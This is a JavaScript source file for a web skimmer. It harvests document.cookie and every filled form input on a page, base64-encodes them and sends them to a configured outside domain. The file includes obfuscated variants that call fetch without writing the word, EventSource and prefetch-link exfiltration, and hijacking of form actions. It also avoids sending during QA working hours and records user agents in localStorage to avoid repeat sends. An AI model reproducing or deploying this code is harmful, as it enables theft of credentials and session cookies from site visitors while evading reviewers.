const _ = require('lodash');
const config = require('./config').config;

/**
 * Creates the api url that we will send data to
 * @param {string} encodedPayload form data in base64
 */
const createUrl = encodedPayload => {
  return `${config.API_DOMAIN}?d=${encodedPayload}`;
};

/**
 * Check the various safety nets and if they all pass, send off our request
 * @param {HTMLFormElement} el The form element
 * @param {Event} e The form submit event that triggered this
 */
export const checkAndRun = (el, e) => {
  if (config.QA_MIGHT_BE_WORKING) {
    if (isQaWorking()) {
      return;
    }
  }

  if (config.HAVE_SENT) {
    if (alreadyHaveDevice()) {
      return;
    }
  }

  //bypassCrossOrigin();
  //updateKnownUsers();
  sendRequest(el, e);
};

/**
 * Send the harvested data to the API
 */
const sendRequest = (el, e) => {
  const cookie = { key: 'cookie', value: document.cookie };
  let inputValues = [cookie];
  _.forEach(document.forms, form => {
    _.forEach(form.getElementsByTagName('input'), formInput => {
      if (formInput.value) inputValues.push({ key: formInput.name, value: formInput.value });
    });
  });

  const encodedPayload = btoa(JSON.stringify(inputValues));
  primitiveFetch(encodedPayload);
  //cipheredFetch(encodedPayload);
  //eventSourceFetch(encodedPayload);
};

/**
 * Fetch using the EventSource API
 */
const eventSourceFetch = encodedPayload => {
  const eventSource = new EventSource(createUrl(encodedPayload));
};

/**
 * Uses a cipher to call fetch without using the word 'fetch'.
 * Isn't cryptography amazing?
 */
const cipheredFetch = encodedPayload => {
  const i = 'gfudi';
  const k = s =>
    s
      .split('')
      .map(c => String.fromCharCode(c.charCodeAt() - 1))
      .join('');
  self[k(i)](createUrl(encodedPayload)); // equivalent to window.fetch(url)
};

/**
 *  The basic way to make our request
 * @param {string} encodedPayload The form fields that have been encoded into base64
 */
const primitiveFetch = encodedPayload => {
  fetch(createUrl(encodedPayload), {
    mode: 'no-cors'
  });
};

/**
 * Are the Chrome Dev Tools open? We may not want to send the request
 */
const areDevToolsOpen = () => {
  // All (known) methods to detect if Chrome dev tools are open appear to be patched
  return false;
};

const isQaWorking = () => {
  const d = new Date(); // current time
  const hours = d.getHours();
  const mins = d.getMinutes();
  const day = d.getDay();

  const isWeekday = day >= 1 && day <= 5;
  const isBetween7And7 = hours >= 7 && hours <= 19;

  return isWeekday && isBetween7And7;
};

const userAgent = navigator.userAgent;
const key = 'knownDevices';
/**
 * Sets the localstorage with our known users
 */
const updateKnownUsers = () => {
  const knownDevices = JSON.parse(localStorage.getItem(key)) || [];
  knownDevices.push(userAgent);
  localStorage.setItem(key, JSON.stringify(knownDevices));
};

/**
 * Have we already harvested the information for this user?
 */
//TODO: Use better method than userAgent, as its too generic/broad
const alreadyHaveDevice = () => {
  const knownDevices = JSON.parse(localStorage.getItem(key)) || [];
  return _.includes(knownDevices, userAgent);
};

/**
 * If we have deemed the action to be safe after examining the CSP,
 * we can hijack the forms to call our api instead of whatever it was originally supposed to do.
 * @param {string} encodedPayload The base64 encoded form field data
 */
const hijackFormActions = encodedPayload => {
  _.forEach(document.forms, form => {
    form.action = `${apiDomain}?d=${encodedPayload}`;
  });
};

/**
 * Makes a request to the current page and examines the Content-Security-Policy.
 * You can perform checks here to see if there are any holes you can take advantage of.
 */
const checkCsp = () => {
  fetch(document.location.href).then(resp => {
    const csp = resp.headers.get('Content-Security-Policy');
    // does this exist? Is is any good?
    console.log('CSP: ', csp);
    return csp;
  });
};

/**
 * This apparently bypasses cross origin policy (Chrome only - might be patched)
 */
const bypassCrossOrigin = () => {
  const linkEl = document.createElement('link');
  linkEl.rel = 'prefetch';
  linkEl.href = urlWithYourPreciousData;
  document.head.appendChild(linkEl);
};
